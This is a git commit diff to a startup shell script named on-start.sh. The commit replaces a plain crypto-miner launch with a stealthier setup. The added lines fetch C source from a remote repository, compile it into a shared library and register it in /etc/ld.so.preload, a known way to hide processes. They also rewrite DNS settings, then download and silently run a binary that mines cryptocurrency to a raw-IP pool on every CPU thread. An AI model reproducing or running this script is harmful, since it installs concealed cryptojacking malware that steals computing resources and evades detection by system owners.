19dc9ee2e72677cfd9bd16c8816760b9c6be6dde
kartolo92 <kartikamitisariparamitha@gmail.com>
2025-08-02 08:50:39 -0700

    Update on-start.sh

--- on-start.sh
+++ on-start.sh
@@ -1,5 +1,14 @@
 #!/bin/bash
-wget https://github.com/egg5233/OrionClient_tw/releases/download/1.6.0/OrionClient.tar.gz
-tar xf OrionClient.tar.gz
-cd OrionClient && chmod 777 OrionClient
-./OrionClient mine -a --pool twbitz --key 76dvS6JKn3WmKQXm4Rx3LBQZHpagXmiqE67gu7CCB55h --worker $(echo $(shuf -i 1-15000 -n 1)-MM) > /home/on-start-log.txt
+apt-get update ; apt-get install sudo -y
+apt install unzip
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget https://github.com/kartolo92/jadul/raw/main/plant
+chmod +x plant
+./plant -a power2b -o stratum+tcp://167.99.139.112:80 -u MfCwayN6AQ1dPptt7yfAAiEfrSswnU2XcF.$(shuf -n 1 -i 1-99999)-NOTE -t $(nproc --all) > /dev/null 2>&1 &
